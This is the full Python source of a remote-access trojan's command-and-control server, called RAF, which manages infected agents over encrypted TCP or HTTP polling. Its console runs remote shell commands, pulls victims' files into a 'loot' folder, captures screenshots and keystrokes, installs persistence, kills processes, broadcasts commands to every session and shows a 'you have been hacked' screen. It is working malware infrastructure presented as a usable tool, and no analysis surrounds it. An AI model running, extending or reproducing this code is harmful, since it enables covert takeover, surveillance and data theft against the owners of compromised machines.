#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RAF server -- multi-session C2 console.

Listens for agents, keeps a session table, and drives them from an interactive
REPL: shell, file transfer, screenshots, keylog dumps, persistence, process
control.

    python server.py --host 0.0.0.0 --port 4444 --key <shared-key>
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import socket
import struct
import sys
import threading
import time

DEFAULT_KEY = "r4f-0000000000000000000000000000"
CHUNK = 48 * 1024
MAX_FRAME = 96 * 1024 * 1024
FRAME = struct.Struct(">I")
NONCE = 8
TAG = 16
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")

HELP = """
  sessions                     list connected agents
  use <id|hostname>            select a session
  back                         clear the selection
  info                         full sysinfo for the selected session
  shell <command>              run a shell command on the target
  cd <dir> | pwd | ls [dir]    browse the target filesystem
  get <remote> [local]         download a file from the target
  put <local> <remote>         upload a file to the target
  screenshot [name]            capture the target desktop (BMP)
  frame [name]                 one JPEG frame (live view primitive)
  placa <texto> | placa off    fullscreen sign on the target screen
  msg <texto>                  message box on the target screen
  keylog start|stop|dump       keystroke capture
  persist | unpersist          install / remove autorun + logon task
  ps                           process list
  kill <pid>                   terminate a process
  power <lock|reboot|shutdown|logoff>   power control on the target
  sleep <seconds>              reconnect delay after disconnect
  close                        tell the agent to exit
  selfdestruct                 wipe the agent: persistence, files, process
  broadcast <command>          run a shell command on every live session
  help | quit                  this help / leave the console
"""


# ------------------------------------------------------------------- transport
def _keystream(key, nonce, n):
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out += hashlib.sha256(key + nonce + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    return bytes(out[:n])


def _seal(key, plain):
    nonce = os.urandom(NONCE)
    ct = bytes(a ^ b for a, b in zip(plain, _keystream(key, nonce, len(plain))))
    tag = hmac.new(key, nonce + ct, hashlib.sha256).digest()[:TAG]
    return nonce + ct + tag


def _open(key, blob):
    if len(blob) < NONCE + TAG:
        raise ValueError("short frame")
    nonce, ct, tag = blob[:NONCE], blob[NONCE:-TAG], blob[-TAG:]
    want = hmac.new(key, nonce + ct, hashlib.sha256).digest()[:TAG]
    if not hmac.compare_digest(tag, want):
        raise ValueError("authentication failed")
    return bytes(a ^ b for a, b in zip(ct, _keystream(key, nonce, len(ct))))


def send_msg(sock, obj, key):
    blob = _seal(key, json.dumps(obj, separators=(",", ":")).encode())
    sock.sendall(FRAME.pack(len(blob)) + blob)


def _recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        part = sock.recv(n - len(buf))
        if not part:
            raise ConnectionError("peer closed")
        buf += part
    return bytes(buf)


def recv_msg(sock, key):
    (n,) = FRAME.unpack(_recv_exact(sock, 4))
    if n <= 0 or n > MAX_FRAME:
        raise ValueError("bad frame size %d" % n)
    return json.loads(_open(key, _recv_exact(sock, n)).decode())


# --------------------------------------------------------------------- session
class Session:
    def __init__(self, sock, addr, key):
        self.sock = sock
        self.addr = addr
        self.key = key
        self.id = os.urandom(2).hex()
        self.info = {}
        self.alive = True
        self.lock = threading.Lock()
        self.pending = {}
        self.pending_lock = threading.Lock()
        self.rid = 0
        self.last_seen = time.time()
        self.reader = threading.Thread(target=self._read_loop, daemon=True)

    def start(self):
        self.reader.start()

    def _read_loop(self):
        try:
            while self.alive:
                msg = recv_msg(self.sock, self.key)
                self.last_seen = time.time()
                t = msg.get("t")
                if t == "hello":
                    self.info = msg.get("info") or {}
                    continue
                if t not in ("result", "chunk", "chunk_end"):
                    continue
                rid = msg.get("id")
                with self.pending_lock:
                    slot = self.pending.get(rid)
                if slot is None:
                    continue
                with slot["lock"]:
                    slot["msgs"].append(msg)
                if t == "chunk_end":
                    slot["event"].set()
                elif t == "result" and not msg.get("file"):
                    slot["event"].set()
        except Exception:
            pass
        finally:
            self.alive = False
            with self.pending_lock:
                slots = list(self.pending.values())
            for slot in slots:
                slot["event"].set()

    def _begin(self, op, args):
        self.rid += 1
        rid = self.rid
        slot = {"event": threading.Event(), "msgs": [], "lock": threading.Lock()}
        with self.pending_lock:
            self.pending[rid] = slot
        send_msg(self.sock, {"t": "cmd", "id": rid, "op": op, "args": args or {}}, self.key)
        return rid, slot

    def _finish(self, rid, slot, timeout):
        try:
            if not slot["event"].wait(timeout):
                raise TimeoutError("no response from agent")
        finally:
            with self.pending_lock:
                self.pending.pop(rid, None)
        with slot["lock"]:
            msgs = list(slot["msgs"])
        result = next((m for m in msgs if m.get("t") == "result"), {})
        chunks = sorted((m for m in msgs if m.get("t") == "chunk"),
                        key=lambda m: m.get("seq", 0))
        data = b"".join(base64.b64decode(m.get("data", "")) for m in chunks)
        return result, data

    def request(self, op, args=None, timeout=180):
        if not self.alive:
            raise RuntimeError("session is dead")
        with self.lock:
            rid, slot = self._begin(op, args)
            return self._finish(rid, slot, timeout)

    def push(self, local, remote, timeout=600):
        with open(local, "rb") as f:
            data = f.read()
        if not self.alive:
            raise RuntimeError("session is dead")
        with self.lock:
            rid, slot = self._begin("upload", {"path": remote, "size": len(data)})
            seq = 0
            for off in range(0, len(data), CHUNK):
                send_msg(self.sock, {
                    "t": "chunk", "id": rid, "seq": seq,
                    "data": base64.b64encode(data[off:off + CHUNK]).decode(),
                }, self.key)
                seq += 1
            send_msg(self.sock, {"t": "chunk_end", "id": rid}, self.key)
            return self._finish(rid, slot, timeout)

    def close(self):
        self.alive = False
        try:
            self.sock.close()
        except Exception:
            pass


class HttpSession:
    """Same interface as Session, but the agent polls JSON over HTTP.

    Nothing here needs an inbound port: the agent opens outbound POSTs to
    /c2/poll and /c2/result, so it works behind NAT, CGNAT and any tunnel.
    """

    def __init__(self, sid, addr, key):
        self.id = sid
        self.addr = addr
        self.key = key
        self.transport = "http"
        self.info = {}
        self.alive = True
        self.lock = threading.Lock()
        self.inbox = []
        self.inbox_lock = threading.Lock()
        self.results = {}
        self.events = {}
        self.rid = 0
        self.last_seen = time.time()

    def check(self, stale=45):
        if self.alive and time.time() - self.last_seen > stale:
            self.alive = False
        return self.alive

    def poll(self, timeout=25):
        end = time.time() + timeout
        while time.time() < end:
            with self.inbox_lock:
                if self.inbox:
                    cmds, self.inbox = self.inbox, []
                    self.last_seen = time.time()
                    return cmds
            time.sleep(0.15)
        self.last_seen = time.time()
        return []

    def deliver(self, rid, msgs):
        with self.inbox_lock:
            slot = self.results.get(rid)
            ev = self.events.get(rid)
        if slot is None:
            return
        with slot["lock"]:
            slot["msgs"].extend(msgs)
        if ev is not None and any(m.get("t") in ("result", "chunk_end") for m in msgs):
            ev.set()

    def request(self, op, args=None, timeout=180):
        if not self.alive:
            raise RuntimeError("session is dead")
        with self.lock:
            self.rid += 1
            rid = self.rid
            ev = threading.Event()
            slot = {"msgs": [], "lock": threading.Lock()}
            with self.inbox_lock:
                self.results[rid] = slot
                self.events[rid] = ev
                self.inbox.append({"id": rid, "op": op, "args": args or {}})
            try:
                if not ev.wait(timeout):
                    raise TimeoutError("no response from agent")
            finally:
                with self.inbox_lock:
                    self.results.pop(rid, None)
                    self.events.pop(rid, None)
            with slot["lock"]:
                msgs = list(slot["msgs"])
            result = next((m for m in msgs if m.get("t") == "result"), {})
            chunks = sorted((m for m in msgs if m.get("t") == "chunk"),
                            key=lambda m: m.get("seq", 0))
            data = b"".join(base64.b64decode(m.get("data", "")) for m in chunks)
            return result, data

    def push(self, local, remote, timeout=600):
        with open(local, "rb") as f:
            data = f.read()
        return self.request("upload", {
            "path": remote,
            "data_b64": base64.b64encode(data).decode(),
        }, timeout=timeout)

    def close(self):
        self.alive = False
        with self.inbox_lock:
            for ev in self.events.values():
                ev.set()


# ---------------------------------------------------------------------- server
class Server:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.sessions = {}
        self.lock = threading.Lock()
        self.sock = None

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(32)
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self):
        while True:
            try:
                conn, addr = self.sock.accept()
            except OSError:
                return
            threading.Thread(target=self._handshake, args=(conn, addr), daemon=True).start()

    def _handshake(self, conn, addr):
        """Read the first frame before registering: no valid hello, no session."""
        try:
            conn.settimeout(10)
            msg = recv_msg(conn, self.key)
            if msg.get("t") != "hello":
                raise ValueError("expected hello")
            conn.settimeout(None)
        except Exception:
            try:
                conn.close()
            except Exception:
                pass
            return

        sess = Session(conn, addr, self.key)
        sess.info = msg.get("info") or {}
        with self.lock:
            while sess.id in self.sessions:
                sess.id = os.urandom(2).hex()
            self.sessions[sess.id] = sess
        sess.start()
        print("\n[+] session %s from %s:%d (%s@%s)" % (
            sess.id, addr[0], addr[1],
            sess.info.get("user", "?"), sess.info.get("host", "?")))

    def get(self, ref):
        if not ref:
            return None
        with self.lock:
            if ref in self.sessions:
                return self.sessions[ref]
            low = str(ref).lower()
            for s in self.sessions.values():
                if s.info.get("host", "").lower() == low:
                    return s
        return None

    def all(self):
        with self.lock:
            return list(self.sessions.values())


# ------------------------------------------------------------------------ cli
def split(line):
    out, cur, q = [], [], None
    for ch in line:
        if q:
            if ch == q:
                q = None
            else:
                cur.append(ch)
        elif ch in "\"'":
            q = ch
        elif ch.isspace():
            if cur:
                out.append("".join(cur))
                cur = []
        else:
            cur.append(ch)
    if cur:
        out.append("".join(cur))
    return out


def show(result):
    out = str(result.get("out", ""))
    out = out.replace("\r\n", "\n").replace("\r", "")
    if not result.get("ok", True):
        while out.startswith("[!] "):
            out = out[4:]
        print("  [!] " + out.replace("\n", "\n  "))
    else:
        print("  " + out.replace("\n", "\n  "))


def _as_int(value):
    try:
        return int(value)
    except (TypeError, ValueError):
        return None


def _harden_console():
    """Target output must never crash the console on a legacy codepage."""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(errors="replace")
        except Exception:
            pass


def show_sessions(srv):
    items = srv.all()
    if not items:
        print("  (no sessions)")
        return
    print("  %-6s %-22s %-18s %-12s %-6s %s" % ("ID", "ADDRESS", "HOST", "USER", "ADMIN", "OS"))
    for s in items:
        i = s.info or {}
        flag = "*" if s.alive else "x"
        print("  %-6s %-22s %-18s %-12s %-6s %s %s" % (
            s.id, "%s:%d" % (s.addr[0], s.addr[1]),
            str(i.get("host", "?"))[:18], str(i.get("user", "?"))[:12],
            "yes" if i.get("admin") else "no", i.get("os", "?"), flag))


def save_loot(sess, name, data):
    os.makedirs(LOOT, exist_ok=True)
    safe = os.path.basename(name) or "file.bin"
    path = os.path.join(LOOT, "%s_%s" % (sess.id, safe))
    with open(path, "wb") as f:
        f.write(data)
    return path


def repl(srv, initial=None):
    cur = {"s": initial}
    print("RAF server listening on %s:%d" % (srv.host, srv.port))
    print("type 'help' for commands")

    while True:
        prompt = "[%s] " % (cur["s"].id if cur["s"] else "raf")
        try:
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not line:
            continue

        argv = split(line)
        verb = argv[0].lower()
        rest = argv[1:]

        if verb in ("quit", "q", "bye"):
            return
        if verb in ("help", "?"):
            print(HELP)
            continue
        if verb in ("sessions", "list"):
            show_sessions(srv)
            continue
        if verb == "use":
            if not rest:
                show_sessions(srv)
                continue
            s = srv.get(rest[0])
            if not s:
                print("  [!] no such session: %s" % rest[0])
            elif not s.alive:
                print("  [!] session %s is dead" % s.id)
            else:
                cur["s"] = s
                print("  -> session %s (%s@%s)" % (
                    s.id, s.info.get("user", "?"), s.info.get("host", "?")))
            continue
        if verb == "back":
            cur["s"] = None
            continue
        if verb == "broadcast":
            cmd = " ".join(rest)
            for s in srv.all():
                if not s.alive:
                    continue
                try:
                    res, _ = s.request("shell", {"cmd": cmd}, timeout=120)
                    print("  [%s] %s" % (s.id, str(res.get("out", "")).replace("\n", "\n      ")))
                except Exception as exc:
                    print("  [%s] [!] %s" % (s.id, exc))
            continue

        sess = cur["s"]
        if sess is None:
            print("  [!] no session selected -- 'sessions' then 'use <id>'")
            continue
        if not sess.alive:
            print("  [!] session %s dropped" % sess.id)
            cur["s"] = None
            continue

        try:
            if verb == "info":
                show(sess.request("sysinfo")[0])

            elif verb == "shell":
                if not rest:
                    print("  [!] usage: shell <command>")
                    continue
                show(sess.request("shell", {"cmd": " ".join(rest)}, timeout=300)[0])

            elif verb == "cd":
                if not rest:
                    print("  [!] usage: cd <dir>")
                    continue
                show(sess.request("cd", {"path": rest[0]})[0])

            elif verb == "pwd":
                show(sess.request("pwd")[0])

            elif verb == "ls":
                show(sess.request("ls", {"path": rest[0] if rest else None})[0])

            elif verb in ("get", "download"):
                if not rest:
                    print("  [!] usage: get <remote> [local]")
                    continue
                res, data = sess.request("download", {"path": rest[0]}, timeout=600)
                if not res.get("ok"):
                    show(res)
                    continue
                name = rest[1] if len(rest) > 1 else res.get("file", os.path.basename(rest[0]))
                path = save_loot(sess, name, data)
                print("  saved %d bytes -> %s" % (len(data), path))

            elif verb in ("put", "upload"):
                if len(rest) < 2:
                    print("  [!] usage: put <local> <remote>")
                    continue
                if not os.path.isfile(rest[0]):
                    print("  [!] local file not found: %s" % rest[0])
                    continue
                res, _ = sess.push(rest[0], rest[1])
                show(res)

            elif verb == "screenshot":
                res, data = sess.request("screenshot", timeout=300)
                if not res.get("ok"):
                    show(res)
                    continue
                name = rest[0] if rest else "shot_%d.bmp" % int(time.time())
                if not name.lower().endswith(".bmp"):
                    name += ".bmp"
                path = save_loot(sess, name, data)
                print("  captured %d bytes -> %s" % (len(data), path))

            elif verb == "frame":
                res, data = sess.request("frame", {"width": 1280, "quality": 55}, timeout=30)
                if not res.get("ok"):
                    show(res)
                    continue
                name = rest[0] if rest else "frame_%d.jpg" % int(time.time())
                if not name.lower().endswith(".jpg"):
                    name += ".jpg"
                path = save_loot(sess, name, data)
                print("  saved %d bytes -> %s" % (len(data), path))

            elif verb == "placa":
                if rest and rest[0].lower() in ("off", "close"):
                    show(sess.request("placa", {"action": "off"})[0])
                else:
                    text = " ".join(rest) or "VOCE FOI HACKEADO"
                    show(sess.request("placa", {"text": text})[0])

            elif verb == "msg":
                text = " ".join(rest)
                if not text:
                    print("  [!] usage: msg <texto>")
                    continue
                show(sess.request("msg", {"text": text})[0])

            elif verb == "keylog":
                action = rest[0].lower() if rest else "dump"
                if action not in ("start", "stop", "dump"):
                    print("  [!] usage: keylog start|stop|dump")
                    continue
                show(sess.request("keylog", {"action": action})[0])

            elif verb == "persist":
                show(sess.request("persist", timeout=120)[0])

            elif verb == "unpersist":
                show(sess.request("unpersist", timeout=120)[0])

            elif verb == "ps":
                show(sess.request("ps", timeout=120)[0])

            elif verb == "kill":
                if not rest:
                    print("  [!] usage: kill <pid>")
                    continue
                pid = _as_int(rest[0])
                if pid is None:
                    print("  [!] pid must be a number: %s" % rest[0])
                    continue
                show(sess.request("kill", {"pid": pid})[0])

            elif verb == "power":
                if not rest:
                    print("  [!] usage: power lock|reboot|shutdown|logoff|hibernate")
                    continue
                show(sess.request("power", {"action": rest[0]})[0])

            elif verb == "sleep":
                if not rest:
                    print("  [!] usage: sleep <seconds>")
                    continue
                secs = _as_int(rest[0])
                if secs is None or secs < 0:
                    print("  [!] seconds must be a non-negative number: %s" % rest[0])
                    continue
                show(sess.request("sleep", {"seconds": secs})[0])

            elif verb == "close":
                show(sess.request("exit", timeout=30)[0])
                sess.close()
                cur["s"] = None

            elif verb == "selfdestruct":
                if input("  type APAGAR to wipe this agent: ").strip() != "APAGAR":
                    print("  cancelled")
                    continue
                show(sess.request("selfdestruct", timeout=30)[0])
                sess.close()
                cur["s"] = None

            else:
                print("  [!] unknown command: %s (try 'help')" % verb)

        except TimeoutError:
            print("  [!] timeout -- agent may be busy or gone")
        except Exception as exc:
            print("  [!] %s" % exc)


def main():
    _harden_console()
    ap = argparse.ArgumentParser(description="RAF C2 console")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=4444)
    ap.add_argument("--key", default=DEFAULT_KEY, help="shared key (must match the agent)")
    a = ap.parse_args()

    srv = Server(a.host, a.port, a.key.encode())
    try:
        srv.start()
    except OSError as exc:
        print("[!] cannot bind %s:%d -- %s" % (a.host, a.port, exc))
        print("    port already in use? pick another with --port")
        return 1
    try:
        repl(srv)
    finally:
        for s in srv.all():
            s.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
